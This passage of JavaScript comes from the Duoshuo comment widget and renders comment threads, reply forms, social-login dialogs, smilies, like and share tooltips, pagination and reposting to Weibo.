                        r.reset("\u5fae\u535a-\u9ed8\u8ba4")
                    })), r.replybox = n, r.el.appendTo(t.body).css({
                        top: n.el.offset().top + n.el.outerHeight() + 4 + "px",
                        left: n.el.find(".ds-textarea-wrapper").offset().left + "px"
                    }), i(t.body).click(E)) : E(e),
                    !1
                }),
                b = a.find(".ds-add-image").click(function(e) {
                    var n = h[0],
                    r = n.value,
                    i = "\u8bf7\u8f93\u5165\u56fe\u7247\u5730\u5740",
                    s = '<img src="' + i + '" />';
                    if (t.selection) {
                        n.value = r.substring(0, v.start) + s + r.substring(v.end, r.length),
                        n.value = n.value.replace("\u8bf4\u70b9\u4ec0\u4e48\u5427 ...", ""),
                        n.focus();
                        var o = t.selection.createRange();
                        o.collapse(),
                        o.findText(i),
                        o.select()
                    } else {
                        n.value = r.substring(0, n.selectionStart) + s + r.substring(n.selectionEnd);
                        var u = n.value.search(i);
                        n.setSelectionRange(u, u + i.length),
                        n.focus()
                    }
                    e.preventDefault()
                }),
                E = n.hideSmilies = function(e) {
                    d.removeClass("ds-expanded"),
                    w.smiliesTooltip.el.detach(),
                    i(t.body).unbind("click", E)
                },
                S = function(e, t) {
                    var n = j('<h2>\u793e\u4ea4\u5e10\u53f7\u767b\u5f55</h2><div class="ds-icons-32">' + i.map(["weibo", "qq", "renren", "kaixin", "douban", "netease", "sohu"],
                    function(e) {
                        return '<a class="ds-' + e + '" href="' + J.loginUrl(e) + '">' + w.sourceName[e] + "</a>"
                    }).join("") + "</div>" + (s.deny_anonymous ? "": '<h2>\u4f5c\u4e3a\u6e38\u5ba2\u7559\u8a00</h2><form><div class="ds-control-group"><input type="text" name="author_name" id="ds-dialog-name" value="' + p(rt.data.name) + '" required />' + '<label for="ds-dialog-name">\u540d\u5b57(\u5fc5\u586b)</label>' + "</div>" + (s.require_guest_email ? '<div class="ds-control-group"><input type="email" name="author_email" id="ds-dialog-email" value="' + p(rt.data.email) + '" required />' + '<label for="ds-dialog-email">\u90ae\u7bb1(\u5fc5\u586b)</label>' + "</div>": "") + (s.require_guest_url ? '<div class="ds-control-group"><input type="url" name="author_url" id="ds-dialog-url" placeholder="http://" value="' + p(rt.data.url || "") + '" />' + '<label for="ds-dialog-url">\u7f51\u5740(\u53ef\u9009)</label>' + "</div>": "") + '<button type="submit">\u53d1\u5e03</button>' + "</form>")),
                    r = n.el.find(".ds-dialog").css("width", "320px");
                    M(r, ".ds-icons-32 a");
                    if (!s.deny_anonymous) {
                        var o = n.el.find("form");
                        o.submit(function(e) {
                            var r = o.find("input[name=author_email]").val();
                            return (r || s.require_guest_email) && !r.match(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/) ? (alert("\u8bf7\u8f93\u5165\u4e00\u4e2a\u6709\u6548\u7684email\u5730\u5740."), !1) : (t(w.toJSON(o)), n.close(), !1)
                        }),
                        o.find("input[name=author_name]")[0].focus()
                    }
                };
                s.deny_anonymous && h.focus(function(e) {
                    if (ct()) {
                        S(f, C);
                        var t = function(e) {
                            e.stopPropagation(),
                            h.unbind("click", t)
                        };
                        h.click(t)
                    }
                    return ! 1
                });
                var C = function(e) {
                    T(f),
                    A("/api/posts/create", i.extend(w.toJSON(f), e),
                    function(e) {
                        var t = e.response,
                        i = dt(n.postList, t, s);
                        s.order == "asc" == (s.formPosition == "top") && w.scrollTo(i),
                        ot[t.post_id] = new et(t),
                        r.data.comments++,
                        r.updateCounter("duoshuo"),
                        h.val("").trigger("keyup"),
                        N(f),
                        a.hasClass("ds-inline-replybox") && (a.detach(), n.actionsBar.removeClass("ds-reply-active"));
                        if (o) try {
                            o.removeItem("ds_draft_" + r.threadId)
                        } catch(u) {}
                    },
                    function(e) {
                        N(f),
                        alert(e.errorMessage)
                    })
                };
                f.submit(function(e) {
                    if (f.data("submitting")) return ! 1;
                    var t = i.trim(f[0].message.value);
                    return t == "" || !x.placeholder && t == h.attr("placeholder") ? (alert("\u60a8\u8fd8\u6ca1\u5199\u5185\u5bb9\u5462"), !1) : (ct() ? S(f, C) : C(), !1)
                });
                var L = function(e) {
                    return i(e).hasClass("ds-service-icon-grey") ? null: i(e).attr("data-service")
                };
                return c.click(function() {
                    return i(this).toggleClass("ds-service-icon-grey").toggleClass("ds-service-icon"),
                    l.value = i.map(c, L).join(","),
                    l.checked = l.value != "",
                    !1
                }),
                i(l).change(function() {
                    var e = this.checked;
                    c[e ? "removeClass": "addClass"]("ds-service-icon-grey")[e ? "addClass": "removeClass"]("ds-service-icon"),
                    this.value = i.map(c, L).join(",")
                }),
                this
            }
        },
        H.Dialog = Z.extend({
            init: function(e, t) { (this.el = i("#ds-wrapper"))[0] || (this.el = _(i('<div id="ds-wrapper"></div>'))),
                this.options = i.extend({
                    width: 600
                },
                t),
                e !== n && i(e).attr("id", "ds-reset").appendTo(this.el)
            },
            open: function() {
                var e = this;
                e.el.hide().appendTo(t.body).fadeIn(200),
                S && e.el.css("top", s.scrollTop() + 100),
                e.el.show().find(".ds-dialog").delegate("a.ds-dialog-close", "click",
                function(t) {
                    return e.close(),
                    !1
                }).click(h);
                var n = function(t) {
                    if (t.which == 27) return e.close(),
                    !1
                },
                r = function(t) {
                    return e.close(),
                    !1
                };
                return a.keydown(n),
                i(t.body).click(r),
                e.close = function(s) {
                    a.unbind("keydown", n),
                    i(t.body).unbind("click", r),
                    e.el.fadeOut(200,
                    function() {
                        i(this).remove()
                    }),
                    e.trigger("close")
                },
                e
            }
        }),
        J.likePanel = function(e) {
            return e.likes ? '<span class="ds-highlight">' + e.likes + "</span> \u4eba\u559c\u6b22": ""
        },
        J.likeTooltip = function(e) {
            var t = {
                qzone: "QQ\u7a7a\u95f4",
                weibo: "\u65b0\u6d6a\u5fae\u535a",
                qqt: "\u817e\u8baf\u5fae\u535a",
                renren: "\u4eba\u4eba\u7f51",
                kaixin: "\u5f00\u5fc3\u7f51",
                douban: "\u8c46\u74e3\u7f51",
                baidu: "\u767e\u5ea6\u641c\u85cf",
                netease: "\u7f51\u6613\u5fae\u535a",
                sohu: "\u641c\u72d0\u5fae\u535a"
            },
            n = [];
            for (var r in t) n.push('<li><a class="ds-share-to-' + r + " ds-service-link ds-" + r + '" href="' + w.hostUrl + "/share-proxy/?" + w.param({
                service: r,
                thread_id: e.thread_id
            }) + '">' + t[r] + "</a></li>");
            var i = Math.ceil(n.length / 2);
            return '<div class="ds-like-tooltip ds-rounded"><p>\u5f88\u9ad8\u5174\u4f60\u80fd\u559c\u6b22\uff0c\u5206\u4eab\u4e00\u4e0b\u5427\uff1a</p><ul>' + n.slice(0, i).join("") + "</ul><ul>" + n.slice(i).join("") + '</ul><p class="ds-like-tooltip-footer"><a class="ds-like-tooltip-close">\u7b97\u4e86</a></p></div>'
        },
        H.Meta = function(e) {
            this.embedThread = e
        },
        H.Meta.prototype = {
            render: function() {
                var r = this,
                s = r.embedThread,
                o = s.data,
                u = r.el = i('<div class="ds-meta"><a href="javascript:void(0)" class="ds-like-thread-button ds-rounded' + (o.user_vote > 0 ? " ds-thread-liked": "") + '"><span class="ds-icon ds-icon-heart"></span>' + ' <span class="ds-thread-like-text">' + (o.user_vote > 0 ? "\u5df2\u559c\u6b22": "\u559c\u6b22") + '</span><span class="ds-thread-cancel-like">\u53d6\u6d88\u559c\u6b22</span></a><span class="ds-like-panel"></span></div>'),
                a = u.find(".ds-like-thread-button").click(function(f) {
                    var l = a.hasClass("ds-thread-liked");
                    A("/api/threads/vote", {
                        thread_id: s.threadId,
                        vote: l ? 0 : 1
                    },
                    function(e) {
                        i.each(e.response.thread,
                        function(e, t) {
                            o[e] = t
                        }),
                        r.resetLikePanel()
                    }),
                    a.toggleClass("ds-thread-liked"),
                    a.find(".ds-thread-like-text").text(l ? "\u559c\u6b22": "\u5df2\u559c\u6b22");
                    var c = function(e) {
                        r.tooltip.detach(),
                        i(t.body).unbind("click", c)
                    };
                    return l ? r.tooltip && c(f) : (r.tooltip === n && (r.tooltip = i(J.likeTooltip(o)).click(h).delegate("a", "click",
                    function(t) {
                        switch (this.className) {
                        case "ds-like-tooltip-close":
                            c(t);
                            break;
                        default:
                            if (!e.open(this.href, "_blank", "height=500,width=600,top=0,left=0,toolbar=no,menubar=no,resizable=yes,location=yes,status=no")) return
                        }
                        return ! 1
                    })), r.tooltip.appendTo(s.innerEl).css({
                        top: u.position().top + u.outerHeight() - 4 + "px",
                        left: 0
                    }), i(t.body).click(c)),
                    !1
                });
                return r.resetLikePanel(),
                ct() && u.hide(),
                r
            },
            resetLikePanel: function() {
                this.el.find(".ds-like-panel").html(J.likePanel(this.embedThread.data))
            }
        },
        J.postListHead = function(e) {
            var t = e.data,
            n = e.options;
            return '<div class="ds-comments-info"><div class="ds-sort"><a class="ds-order-desc">' + k.latest + '</a><a class="ds-order-asc">' + k.earliest + '</a><a class="ds-order-hot">' + k.hottest + '</a></div><ul class="ds-comments-tabs"><li class="ds-tab"><a class="ds-comments-tab-duoshuo ds-current" href="javascript:void(0);"></a></li>' + (n.show_reposts && t.reposts ? '<li class="ds-tab"><a class="ds-comments-tab-repost" href="javascript:void(0);"></a></li>': "") + (n.show_weibo && t.weibo_reposts ? '<li class="ds-tab"><a class="ds-comments-tab-weibo" href="javascript:void(0);"></a></li>': "") + (n.show_qqt && t.qqt_reposts ? '<li class="ds-tab"><a class="ds-comments-tab-qqt" href="javascript:void(0);"></a></li>': "") + "</ul>" + "</div>"
        },
        H.PostListHead = function(e) {
            this.embedThread = e
        },
        H.PostListHead.prototype = {
            render: function() {
                var e = this.embedThread,
                t = e.options,
                n = e.postList,
                r = this.el = i(J.postListHead(e)),
                s = r.find("ul.ds-comments-tabs").delegate(".ds-tab a", "click",
                function(t) {
                    s.find("a.ds-current").removeClass("ds-current"),
                    n.params.page = 1;
                    var r = t.currentTarget;
                    switch (r.className) {
                    case "ds-comments-tab-duoshuo":
                        n.params.source = "duoshuo",
                        e.replybox.el.show();
                        break;
                    case "ds-comments-tab-repost":
                        n.params.source = "repost",
                        e.replybox.el.hide();
                        break;
                    case "ds-comments-tab-weibo":
                        n.params.source = "weibo",
                        e.replybox.el.hide();
                        break;
                    case "ds-comments-tab-qqt":
                        n.params.source = "qqt",
                        e.replybox.el.hide();
                        break;
                    default:
                    }
                    return i(r).addClass("ds-current"),
                    n.refetch(),
                    !1
                }),
                o = r.find(".ds-sort").delegate("a", "click",
                function(e) {
                    return o.find("a.ds-current").removeClass("ds-current"),
                    n.params.order = t.order = this.className.replace("ds-order-", ""),
                    n.params.page = 1,
                    n.refetch(),
                    i(this).addClass("ds-current"),
                    !1
                });
                return o.find(".ds-order-" + n.params.order).addClass("ds-current"),
                this
            }
        },
        H.Paginator = function(e) {
            e = e || {};
            var t = this,
            n = t.el = e.el || i('<div class="ds-paginator"></div>'),
            r = t.collection = e.collection;
            n.delegate("a", "click",
            function(e) {
                return r.params.page = parseInt(this.innerHTML),
                r.refetch(),
                n.find(".ds-current").removeClass("ds-current"),
                i(this).addClass("ds-current"),
                !1
            })
        },
        H.Paginator.prototype = {
            reset: function(e) {
                function i(e) {
                    r.push('<a data-page="' + e + '" href="javascript:void(0);">' + e + "</a>")
                }
                var t = this.collection.params.page || 1,
                n, r = [];
                if (t > 1) {
                    i(1),
                    n = t > 4 ? t - 2 : 2,
                    n > 2 && r.push('<span class="page-break">...</span>');
                    for (; n < t; n++) i(n)
                }
                r.push('<a data-page="' + t + '" href="javascript:void(0);" class="ds-current">' + t + "</a>");
                if (t < e.pages) {
                    for (n = t + 1; n <= t + 4 && n < e.pages; n++) i(n);
                    n < e.pages && r.push('<span class="page-break">...</span>'),
                    i(e.pages)
                }
                this.el.html('<div class="ds-border"></div>' + r.join(" "))[e.pages > 1 ? "show": "hide"]()
            }
        },
        J.smiliesTooltip = function(e) {
            var t = '<div id="ds-smilies-tooltip"><ul class="ds-smilies-tabs">';
            for (var n in e) t += "<li><a>" + n + "</a></li>";
            return t + '</ul><div class="ds-smilies-container"></div></div>'
        },
        w.addSmilies = function(e, t) {
            var n = w.smiliesTooltip;
            n && n.el.find("ul.ds-smilies-tabs").append("<li><a>" + e + "</a></li>"),
            w.smilies[e] = t
        },
        H.SmiliesTooltip = function() {},
        H.SmiliesTooltip.prototype = {
            render: function() {
                var e = this,
                n = e.el = i(J.smiliesTooltip(q));
                return n.click(h).find("ul.ds-smilies-tabs").delegate("a", "click",
                function(t) {
                    e.reset(this.innerHTML)
                }),
                n.find(".ds-smilies-container").delegate("img", "click",
                function(n) {
                    var r = e.replybox,
                    i = r.el.find("textarea")[0],
                    s = i.value;
                    if (t.selection) {
                        i.value = s.substring(0, v.start) + this.title + s.substring(v.end, s.length),
                        i.value = i.value.replace(k.leave_a_message, ""),
                        i.focus();
                        var o = t.selection.createRange();
                        o.moveStart("character", v.start + this.title.length),
                        o.collapse(),
                        o.select()
                    } else {
                        var u = i.selectionStart + this.title.length;
                        i.value = s.substring(0, i.selectionStart) + this.title + s.substring(i.selectionEnd),
                        i.setSelectionRange(u, u)
                    }
                    r.hideSmilies(),
                    i.focus()
                }),
                this
            },
            reset: function(e) {
                var t = this.el.find("ul.ds-smilies-tabs");
                t.find("a.ds-current").removeClass("ds-current"),
                t.find("a").filter(function() {
                    return this.innerHTML == e
                }).addClass("ds-current");
                var n = "<ul>";
                return i.each(q[e],
                function(t, r) {
                    var i = e.indexOf("\u5fae\u535a") === 0 ? "http://img.t.sinajs.cn/t35/style/images/common/face/ext/normal/" + r.replace("_org", "_thumb") : b + "/images/smilies/" + r;
                    e === "WordPress" && (t = " " + t + " "),
                    n += '<li><img src="' + i + '" title="' + p(t) + '" /></li>'
                }),
                n += "</ul>",
                this.el.find(".ds-smilies-container").html(n),
                this
            }
        },
        J.postPlaceholder = function() {
            return '<li class="ds-post ds-post-placeholder">' + k.no_comments_yet + "</li>"
        },
        J.post = function(e, t) {
            var n = K(e),
            r = n.user_id ? ' data-user-id="' + n.user_id + '"': "",
            s = n.qqt_account || "",
            o = J.timeHtml(e.created_at, e.url),
            u = e.parents || [];
            switch (e.source) {
            case "duoshuo":
                o += '<a class="ds-post-reply" href="javascript:void(0);"><span class="ds-icon ds-icon-reply"></span>' + k.reply + "</a>" + J.likePost(e) + '<a class="ds-post-repost" href="javascript:void(0);"><span class="ds-icon ds-icon-share"></span>' + k.repost + "</a>" + '<a class="ds-post-report" href="javascript:void(0);"><span class="ds-icon ds-icon-report"></span>' + k.report + "</a>" + (e.privileges["delete"] ? '<a class="ds-post-delete" href="javascript:void(0);"><span class="ds-icon ds-icon-delete"></span>' + k["delete"] + "</a>": "");
                break;
            case "qqt":
            case "weibo":
                o += '<a class="ds-weibo-comments" href="javascript:void(0);">' + k.comments + (e.type.match(/\-comment$/) ? "": '(<span class="ds-count">' + e.comments + "</span>)") + "</a>" + '<a class="ds-weibo-reposts" href="javascript:void(0);">' + k.reposts + (e.type.match(/\-comment$/) ? "": '(<span class="ds-count">' + e.reposts + "</span>)") + "</a>";
                break;
            default:
            }
            return '<li class="ds-post" data-post-id="' + e.post_id + '"><div class="ds-post-self" data-post-id="' + e.post_id + '" data-thread-id="' + e.thread_id + '" data-root-id="' + e.root_id + '" data-source="' + e.source + '"><div class="ds-avatar"' + r + ">" + J.avatar(n) + (w.sourceName[e.source] ? J.serviceIcon(e.source) : "") + '</div><div class="ds-comment-body"><div class="ds-comment-header">' + (n.url ? '<a class="ds-user-name ds-highlight" data-qqt-account="' + s + '" href="' + p(n.url) + '" ' + (n.user_id ? " onclick=\"this.href='" + w.hostUrl + "/user-url/?user_id=" + n.user_id + "';\"": "") + ' rel="nofollow" target="_blank"' + r + ">" + p(n.name) + "</a>": '<span class="ds-user-name"' + r + ' data-qqt-account="'+s+'">'+p(n.name)+"</span>") +"<span class=\"ua\">" + sskadmin(e.author) + "</span><span class=\"ua\">" + ua(e.agent) +"</span><span class=\"ua\">"+ os(e.agent) + "</span>" +"</div>" + (t.max_depth == 1 && t.show_context && u.length ? '<ol id="ds-ctx">' + i.map(u,
            function(e, t) {
                return (t == 1 && u.length > 2 ? '<li class="ds-ctx-entry"><a href="javascript:void(0);" class="ds-expand">\u8fd8\u6709' + (u.length - 2) + "\u6761\u8bc4\u8bba</a></li>": "") + (ot[e] ? J.ctxPost(ot[e].data, t, t && t < u.length - 1) : "")
            }).join("") + "</ol>": "") + "<p>" + (u.length >= t.max_depth && (!t.show_context || t.max_depth > 1) && e.parent_id && ot[e.parent_id] ? '<a class="ds-comment-context" data-post-id="' + e.post_id + '" data-parent-id="' + e.parent_id + '">' + k.reply_to + p(K(ot[e.parent_id].data).name) + ": </a>": "") + e.message + '</p><div class="ds-comment-footer ds-comment-actions' + (e.vote > 0 ? " ds-post-liked": "") + '">' + o + "</div></div></div>" + (t.max_depth > 1 && (e.childrenArray || e.children) && e.source != "weibo" && e.source != "qqt" ? '<ul class="ds-children">' + i.map(e.childrenArray || e.children,
            function(e) {
                return ot[e] ? J.post(ot[e].data, t) : ""
            }).join("") + "</ul>": "") + "</li>"
        };
        var $ = i('<div id="ds-bubble"><div class="ds-bubble-content"></div><div class="ds-arrow ds-arrow-down ds-arrow-border"></div><div class="ds-arrow ds-arrow-down"></div></div>'),
        G = $.find(".ds-bubble-content").delegate("a.ds-ctx-open", "click",
        function(e) {
            L("/api/posts/conversation", {
                post_id: G.attr("data-post-id")
            },
            function(e) {
                t.el.find("ol").html(i.map(e.response, J.ctxPost).join("\n"))
            });
            var t = j('<h2>\u67e5\u770b\u5bf9\u8bdd</h2><ol id="ds-ctx"></ol>');
            return t.el.find(".ds-dialog").css("width", "600px"),
            t.el.find(".ds-dialog-body").css({
                "max-height": "350px",
                _height: "350px",
                "overflow-y": "auto",
                "padding-top": "10px"
            }),
            !1
        }),
        Y = bubbleOutTimer = 0,
        tt = function() {
            bubbleOutTimer && (clearTimeout(bubbleOutTimer), bubbleOutTimer = 0)
        };
        bubbleOut = function() {
            bubbleOutTimer = setTimeout(function() {
                bubbleOutTimer = 0,
                $.detach()
            },
            400)
        },
        $.mouseenter(tt).mouseleave(bubbleOut),
        J.userInfo = function(e) {
            var t = [];
            return i.each(e.social_uid,
            function(e, n) {
                t.push('<a href="' + w.REMOTE + "/user-proxy/" + e + "/" + n + '/" target="_blank" class="ds-service-icon ds-' + e + '" title="' + w.sourceName[e] + '"></a>')
            }),
            '<a href="' + p(e.url) + '" class="ds-avatar" target="_blank">' + J.avatarImg(e) + '</a><a href="' + p(e.url) + '" class="ds-user-name ds-highlight" target="_blank">' + p(e.name) + "</a>" + t.join("") + '<p class="ds-user-card-meta"><a href="' + w.REMOTE + "/profile/" + e.user_id + '/" target="_blank"><span class="ds-highlight">' + e.comments + "</span>\u6761\u8bc4\u8bba</a></p>" + (e.description ? '<p class="ds-user-description">' + p(e.description) + "</p>": "")
        },
        P.PostList = function(e) {
            e && (e.params && (this.params = e.params), e.embedThread && (this.embedThread = e.embedThread)),
            this.el = i('<ul class="ds-comments"></ul>')
        },
        P.PostList.prototype = {
            url: "/api/threads/listPosts",
            render: function() {
                return vt.call(this.el, this.embedThread, this.embedThread.options),
                this
            },
            reset: function(e) {
                var t = this.embedThread.options;
                this.el.html(e[0] ? i.map(e,
                function(e) {
                    return ot[e] ? J.post(ot[e].data, t) : ""
                }).join("") : J.postPlaceholder())
            },
            refetch: function() {
                var e = this,
                n = i(J.indicator()).appendTo(t.body).fadeIn(200);
                e.el.fadeTo(200, .5),
                L(e.url, e.params,
                function(t) {
                    at(ot, t.parentPosts || t.relatedPosts),
                    at(ut, t.users),
                    e.reset(t.response),
                    e.embedThread.paginator.reset(t.cursor),
                    e.el.fadeTo(200, 1),
                    w.scrollTo(e.el),
                    n.remove()
                })
            }
        },
        w.repostDialog = function(e, t, n, r) {
            var i = j('<h2>\u8f6c\u53d1\u5230\u5fae\u535a</h2><div class="ds-quote"><strong>@' + p(K(e.data).name) + "</strong>: " + e.data.message + "</div>" + "<form>" + Q({
                post_id: e.data.post_id
            }) + '<div class="ds-textarea-wrapper">' + '<textarea name="message" title="Ctrl+Enter\u5feb\u6377\u63d0\u4ea4" placeholder="' + p(k.repost_reason) + '">' + p(t) + "</textarea>" + '<pre class="ds-hidden-text"></pre>' + "</div>" + '<div class="ds-actions">' + (r ? Q({
                "service[]": r
            }) : '<label><input type="checkbox" name="service[]" value="weibo"' + (rt.data.social_uid.weibo ? ' checked="checked"': "") + ' /><span class="ds-service-icon ds-weibo"></span>\u65b0\u6d6a\u5fae\u535a</label>  ' + '<label><input type="checkbox" name="service[]" value="qqt"' + (rt.data.social_uid.qq ? ' checked="checked"': "") + ' /><span class="ds-service-icon ds-qqt"></span>\u817e\u8baf\u5fae\u535a</label>') + '<button type="submit">' + k.repost + "</button>" + "</div>" + "</form>"),
            s = i.el.find("form").submit(function(e) {
                return ! r && !s.find("[type=checkbox]:checked")[0] ? (alert("\u8fd8\u6ca1\u6709\u9009\u53d1\u5e03\u5230\u54ea\u513f\u5462"), !1) : (A("/api/posts/repost", w.toJSON(s),
                function(e) {
                    if (n && r) {
                        var t = n.options,
                        i = dt(n.postList.el, e.response[r], t);
                        t.order == "asc" == (t.formPosition == "top") && w.scrollTo(i);
                        var s = n.el.find(".ds-comments-tab-" + r + " span.ds-highlight");
                        s.html(parseInt(s.html()) + 1)
                    }
                }), i.close(), !1)
            });
            return s.find(".ds-actions [type=checkbox]").change(function(e) {
                var t = this.value;
                if (this.checked && !rt.data.social_uid[t == "qqt" ? "qq": t]) {
                    mt(t);
                    return
                }
            }),
            B(s.find("textarea")).keyup(g).keyup(y).focus(),
            !1
        },
        J.toolbar = function(e) {
            var t = J.logoutUrl();
            return '<div class="ds-toolbar"><div class="ds-account-control"><span class="ds-icon ds-icon-settings"></span> <span>\u5e10\u53f7\u7ba1\u7406</span><ul><li><a class="ds-bind-more" href="javascript:void(0);" style="border-top: none">\u7ed1\u5b9a\u66f4\u591a</a></li><li><a target="_blank" href="' + w.REMOTE + "/settings/" + W(X()) + '">' + p(k.settings) + "</a></li>" + '<li><a rel="nofollow" href="' + t + '" style="border-bottom: none">\u767b\u51fa</a></li>' + "</ul>" + "</div>" + '<div class="ds-visitor">' + (rt.data.url ? '<a class="ds-visitor-name" href="' + p(rt.data.url) + '" target="_blank">' + p(rt.data.name) + "</a>": '<span class="ds-visitor-name">' + p(rt.data.name) + "</span>") + '<a class="ds-unread-comments-count" href="javascript:void(0);" title="\u65b0\u56de\u590d"></a>' + "</div>" + "</div>"
        },
        H.EmbedThread = R.extend({
            uri: "/api/threads/listPosts",
            params: "thread-id local-thread-id source-thread-id thread-key category channel-key author-key author-id url limit order max-depth form-position container-url" + (f.match(/MSIE 6\.0/) ? "": " title image thumbnail"),
            render: function() {
                var e = this.el.attr("id", "ds-thread").append(J.waitingImg()),
                t = e.width(),
                n = e.data("url") || !e.attr("data-thread-id") && i("link[rel=canonical]").attr("href");
                n ? e.data("url", d(n)) : e.data("container-url", r.href),
                t && t <= 400 && e.addClass("ds-narrow").data("max-depth", 1)
            },
            updateCounter: function(e) {
                var t = {
                    duoshuo: ["comments", "\u8bc4\u8bba"],
                    repost: ["reposts", "\u8f6c\u8f7d"],
                    weibo: ["weibo_reposts", "\u65b0\u6d6a\u5fae\u535a"],
                    qqt: ["qqt_reposts", "\u817e\u8baf\u5fae\u535a"]
                };
                for (var n in t) if (!e || e == n) {
                    var r = this.data[t[n][0]];
                    this.el.find(".ds-comments-tab-" + n).html(this.el.hasClass("ds-narrow") ? '<span class="ds-service-icon ds-' + n + '"></span>' + r: (r ? '<span class="ds-highlight">' + r + "</span>\u6761": "") + t[n][1])
                }
            },
            onError: function(e) {
                this.el.html("\u8bc4\u8bba\u6846\u51fa\u9519\u5566(" + e.code + "): " + e.errorMessage)
            },
            onload: function(t) {
                var r = this,
                s = r.threadId = t.thread.thread_id,
                u = t.cursor,
                a = r.options = t.options,
                f = r.innerEl = _(i('<div id="ds-reset"></div>').appendTo(r.el));
                r.data = t.thread,
                at(ot, t.parentPosts || t.relatedPosts),
                at(ut, t.users),
                r.el.find("#ds-waiting").remove(),
                a.like_thread_enabled && (r.meta = new H.Meta(r), r.meta.render().el.appendTo(f)),
                a.hot_posts && t.hotPosts && t.hotPosts.length && (r.hotPosts = new H.HotPosts(i('<div class="ds-rounded"></div>'), {
                    max_depth: 1,
                    show_context: a.show_context
                }), r.hotPosts.thread = r, r.hotPosts.el.appendTo(f), r.hotPosts.onload({
                    response: t.hotPosts,
                    options: {}
                })),
                r.postListHead = new H.PostListHead(r),
                r.postList = new P.PostList({
                    embedThread: r,
                    params: {
                        source: "duoshuo",
                        thread_id: s,
                        max_depth: a.max_depth,
                        order: a.order,
                        limit: a.limit
                    }
                }),
                r.postList.render().reset(t.response),
                r.paginator = new H.Paginator({
                    collection: r.postList
                }),
                r.paginator.reset(u);
                var l = r.replybox = new H.Replybox(r),
                c = l.render().el.find("textarea");
                l.postList = r.postList.el;
                if (o) {
                    var h = "ds_draft_" + s;
                    c.bind("focus blur keyup",
                    function(e) {
                        var t = i(e.currentTarget).val();
                        try {
                            o[h] = t
                        } catch(e) {}
                    }),
                    o[h] && c.val(o[h])
                }
                if (ct()) {
                    var p = i(J.loginButtons()).delegate("a.ds-more-services", "click",
                    function() {
                        return p.find(".ds-additional-services").toggle(),
                        !1
                    });
                    M(p)
                } else r.toolbar = i(J.toolbar()).delegate(".ds-account-control", "mouseenter",
                function() {
                    i(this).addClass("ds-active")
                }).delegate(".ds-account-control", "mouseleave",
                function() {
                    i(this).removeClass("ds-active")
                }).delegate("a.ds-bind-more", "click",
                function() {
                    var e = j("<h2>\u7ed1\u5b9a\u66f4\u591a\u5e10\u53f7</h2>" + J.serviceList(1) + J.additionalServices(1) + '<div style="clear:both"></div>').el.find(".ds-dialog").addClass("ds-dialog-bind-more").css("width", "300px");
                    return M(e),
                    !1
                }).delegate("a.ds-unread-comments-count", "click",
                function(e) {
                    return U("unread-comments"),
                    !1
                });
                r.postListHead.render().el.appendTo(f)[a.formPosition == "top" ? "before": "after"]('<a name="respond"></a>', r.toolbar || p, l.el).after(r.postList.el, r.paginator.el),
                r.updateCounter(),
                t.alerts && i.each(t.alerts,
                function(e, t) {
                    i('<div class="ds-alert">' + t + "</div>").insertBefore(r.toolbar || p)
                }),
                a.message && c.val(a.message).focus(),
                i(J.poweredBy(a.poweredby_text)).appendTo(f),
                it.on("reset",
                function() {
                    var e = it.data.comments || 0;
                    f.find("a.ds-unread-comments-count").html(e).attr("title", e ? "\u4f60\u6709" + e + "\u6761\u65b0\u56de\u590d": "\u4f60\u6ca1\u6709\u65b0\u56de\u590d").css("display", e ? "inline": "none")
                }),
                a.mzadx_id && (w.require("mzadxN",
                function() {}), i('<div id="MZADX_' + a.mzadx_id + '" style="margin:0 auto;"></div>').appendTo(f), __mz_rpq = e.__mz_rpq || [], __mz_rpq.push({
                    l: [a.mzadx_id],
                    r: "1",
                    _srv: "MZADX",
                    _callback: function(e, t) {}
                })),
                w.thread = r,
                it.data !== n && it.trigger("reset"),
                ct() || D({
                    visit_thread_id: r.threadId
                })
            },
            onMessage: function(e) {
                dt(this.postList.el, e, this.options)
            }
        }),
        J.hotPosts = function(e, t) {
            return '<div class="ds-header ds-gradient-bg">' + k.hot_posts_title + "</div><ul>" + i.map(e,
            function(e) {
                return ot[e] ? J.post(ot[e].data, t) : ""
            }).join("") + "</ul>"
        },
        H.HotPosts = R.extend({
            params: "show-quote",
            tmpl: "hotPosts",
            render: function() {
                return this.el.attr("id", "ds-hot-posts"),
                this
            },
            onload: function(e) {
                R.prototype.onload.call(this, e),
                vt.call(this.el.find("ul"), this.thread, this.options)
            }
        }),
        J.commentList = function(e, t) {
            return i.map(e,
            function(e) {
                var n = K(e);
                return '<li class="ds-comment' + (t.show_avatars ? " ds-show-avatars": "") + '" data-post-id="' + e.post_id + '">' + (t.show_avatars ? '<div class="ds-avatar">' + J.avatar(n, t.avatar_size) + "</div>": "") + '<div class="ds-meta">' + J.userAnchor(n) + (t.show_time ? J.timeHtml(e.created_at) : "") + "</div>" + (t.show_title ? '<div class="ds-thread-title">\u5728 <a href="' + p(e.thread.url + "#comments") + '">' + p(e.thread.title) + '</a> \u4e2d\u8bc4\u8bba</div><div class="ds-excerpt">' + e.message + "</div>": '<a class="ds-excerpt" title="' + p(e.thread.title) + ' \u4e2d\u7684\u8bc4\u8bba" href="' + p(e.thread.url + "#comments") + '">' + e.message + "</a>") + "</li>"
            }).join("")
        },
        H.RecentComments = R.extend({
            uri: "/api/sites/listRecentPosts",
            params: "show-avatars show-time show-title avatar-size show-admin excerpt-length num-items channel-key",
            tmpl: "commentList",
            render: function() {
                this.el.attr("id", "ds-recent-comments")
            }
        }),
        J.recentVisitors = function(e, t) {
            return i.map(e,
            function(e) {
                return '<div class="ds-avatar">' + J.avatar(e, t.avatar_size) + "</div>"
            }).join("")
        },
        H.RecentVisitors = R.extend({
            uri: "/api/sites/listVisitors",
            params: "show-time avatar-size num-items channel-key",
            tmpl: "recentVisitors",
            render: function() {
                this.el.children().detach(),
                this.el.attr("id", "ds-recent-visitors").append(this.waitingEl = i(J.waitingImg()))
            }
        }),
        J.topUsers = function(e, t) {
            return i.map(e,
            function(e) {
                return '<div class="ds-avatar">' + J.avatar(e, t.avatar_size) + "<h4>" + e.name + "</h4>" + "</div>"
            }).join("")
        },
        H.TopUsers = R.extend({
            uri: "/api/sites/listTopUsers",
            params: "show-time avatar-size num-items channel-key",
            tmpl: "topUsers",
            render: function() {
                this.el.children().detach(),
